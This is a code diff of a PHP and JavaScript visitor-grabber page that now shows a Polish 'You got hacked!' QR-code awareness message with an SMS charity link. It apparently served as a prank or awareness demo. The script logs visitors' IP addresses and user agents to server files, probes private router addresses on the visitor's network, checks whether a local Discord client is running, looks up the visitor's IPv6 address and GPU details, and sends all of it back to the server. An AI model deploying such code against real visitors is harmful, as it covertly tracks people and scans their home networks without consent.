@@ -4,28 +4,6 @@ session_start();
 
 
 if (isset($_POST['k']) && isset($_POST['v'])){ // If the browser is POSTING the gathered data to us
-   
-    // If it's the first time this user has had this IP address, or user agent.
-    if (!in_array($_SERVER['REMOTE_ADDR'], $_SESSION['ips']) || !in_array($_SERVER['HTTP_USER_AGENT'], $_SESSION['agents'])){
-        if (!in_array($_SERVER['REMOTE_ADDR'], $_SESSION['ips'])){
-            array_push($_SESSION['ips'], $_SERVER['REMOTE_ADDR']);
-        }
-        if (!in_array($_SERVER['HTTP_USER_AGENT'], $_SESSION['agents'])){
-            array_push($_SESSION['agents'], $_SERVER['HTTP_USER_AGENT']);
-        }
-        $fileContents = file_get_contents($_SESSION['fileName']);
-
-        file_put_contents($_SESSION['fileName'], $_SERVER['REMOTE_ADDR'] . " -- " . $_SERVER['HTTP_USER_AGENT'] . "\n" . $fileContents);
-    }
-
-    // If this IP or User-Agent is different than the last one we got
-    if ($_SESSION['latestIP'] != $_SERVER['REMOTE_ADDR'] || $_SESSION['latestUA'] != $_SERVER['HTTP_USER_AGENT']){
-        $_SESSION['latestIP'] = $_SERVER['REMOTE_ADDR'];
-        $_SESSION['latestUA'] = $_SERVER['HTTP_USER_AGENT'];
-
-        file_put_contents($_SESSION['fileName'], $_SERVER['REMOTE_ADDR'] . " -- " . $_SERVER['HTTP_USER_AGENT'] . "\n" . $fileContents);
-    } 
-
     file_put_contents($_SESSION['fileName'], $_POST['k'] . ": " . $_POST['v'] . "\n", FILE_APPEND | LOCK_EX);
     return;
 }
@@ -34,7 +12,7 @@ if (isset($_POST['k']) && isset($_POST['v'])){ // If the browser is POSTING the 
 // If we haven't initialized a session yet
 if (!array_key_exists('firstSeen', $_SESSION)){ 
     if (!file_exists('output/')) {
-        mkdir('output', 0777, true);
+        mkdir('output', 0755, true);
     }
     $_SESSION['firstSeen'] = date("Y-m-d-h:i:s");
     $_SESSION['fileName'] = 'output/' . $_SESSION['firstSeen'] . "-" . $_SERVER['REMOTE_ADDR'] . ".txt";
@@ -50,40 +28,42 @@ if (isset($_SERVER['HTTP_REFERER'])){
 }
 ?>
 
-<title>404 Not-Found</title>
+<title>Hacked!</title>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
 
 <style>
 html {
-    height: 100%;
-
+     height: 100%;
+}
+ body {
+     background-color: black;
+}
+ p {
+    color:#20C20E;
+     text-align: center;
+     font-size: xx-large;
+     font-family: 'Courier New', Courier, monospace;
+}
+ a {
+    color: #B83364;
+}
+ #main{
+     display: table;
+     width: 100%;
+     height: 100vh;
+     text-align: center;
+}
+ .fof{
+     display: table-cell;
+     vertical-align: middle;
+}
+ .fof h1{
+     font-size: 50px;
+     display: inline-block;
+     padding-right: 12px;
+     animation: type .5s alternate infinite;
 }
 
-body{
-    font-family: 'Lato', sans-serif;
-    color: #888;
-    margin: 0;
-
-}
-
-#main{
-    display: table;
-    width: 100%;
-    height: 100vh;
-    text-align: center;
-}
-
-.fof{
-	  display: table-cell;
-	  vertical-align: middle;
-}
-
-.fof h1{
-	  font-size: 50px;
-	  display: inline-block;
-	  padding-right: 12px;
-	  animation: type .5s alternate infinite;
-}
 </style>
 
 <script>
@@ -147,16 +127,29 @@ window.onload = function(){
 
     running++
     //resp['router'] = "";
-    checkForRouter("https://192.168.0.1");
-    checkForRouter("https://192.168.0.254");
-    checkForRouter("https://10.0.0.1");
-    checkForRouter("https://10.0.0.254");
-    checkForRouter("https://192.168.1.1");
-    checkForRouter("https://192.168.1.254");
-    checkForRouter("https://172.16.0.1");
-    checkForRouter("https://172.16.0.254");
-    checkForRouter("https://172.16.1.1");
-    checkForRouter("https://172.16.1.254");
+        checkForRouter("https://192.168.0.1");
+        checkForRouter("https://192.168.10.1");
+        checkForRouter("https://192.168.0.254");
+        checkForRouter("https://10.0.0.1");
+        checkForRouter("https://10.0.0.254");
+        checkForRouter("https://192.168.1.1");
+        checkForRouter("https://192.168.1.254");
+        checkForRouter("https://172.16.0.1");
+        checkForRouter("https://172.16.0.254");
+        checkForRouter("https://172.16.1.1");
+        checkForRouter("https://172.16.1.254");
+
+        checkForRouter("http://192.168.0.1");
+        checkForRouter("http://192.168.10.1");
+        checkForRouter("http://192.168.0.254");
+        checkForRouter("http://10.0.0.1");
+        checkForRouter("http://10.0.0.254");
+        checkForRouter("http://192.168.1.1");
+        checkForRouter("http://192.168.1.254");
+        checkForRouter("http://172.16.0.1");
+        checkForRouter("http://172.16.0.254");
+        checkForRouter("http://172.16.1.1");
+        checkForRouter("http://172.16.1.254");
 
     // Get GPU info to further verify platform
     running++
@@ -230,8 +223,8 @@ window.onload = function(){
     running++
     // Get IPV6 address
     $.ajax({
-        url: "https://ipv6.hastysec.dev",
-        dataType: "text",
+        url: "https://api64.ipify.org",
+        dataType: "html",
         cache: "false",
         complete: function(one, two) {
             if (two == "success") {
@@ -251,32 +244,7 @@ window.onload = function(){
     });
 
     running++
-    // Get request packet info
-    $.ajax({
-        url: "https://mtu.hastysec.dev",
-        dataType: "text",
-        cache: "false",
-        complete: function(one, two) {
-            if (two == "success") {
-                //resp['mtu'] = one.responseText;
-                submitResult('mtu', one.responseText);
 
-
-            } else {//if (two == "timeout") {
-                //resp['mtu'] = "Unable to retrieve";
-                submitResult('mtu', "Unable to retrieve");
-
-            }
-        },
-        error: function(one, two, three) {
-            //resp['mtu'] = "Unable to retrieve";
-            submitResult('mtu', "Unable to retrieve");
-
-        },
-        timeout: 3000
-    });
-
-    running++
     // Is discord open?
     $.ajax({
         url: "http://127.0.0.1:6463/",
@@ -484,7 +452,10 @@ window.onload = function(){
 <body>
 <div id="main">
     <div class="fof">
-        <h1>The requested page has been removed</h1>
+    <p><strong>Dałeś się shackować!</strong></p>
+<p>O ile jesteś w stanie zobaczyć link w jaki klikasz</p>
+<p>o tyle skanując QR CODE nie masz tej szansy!</p>
+<p><a href="sms:72365;?&body=SIEPOMAGA">NIE KLIKAJ</a></p>
     </div>
 </div>
 </body>
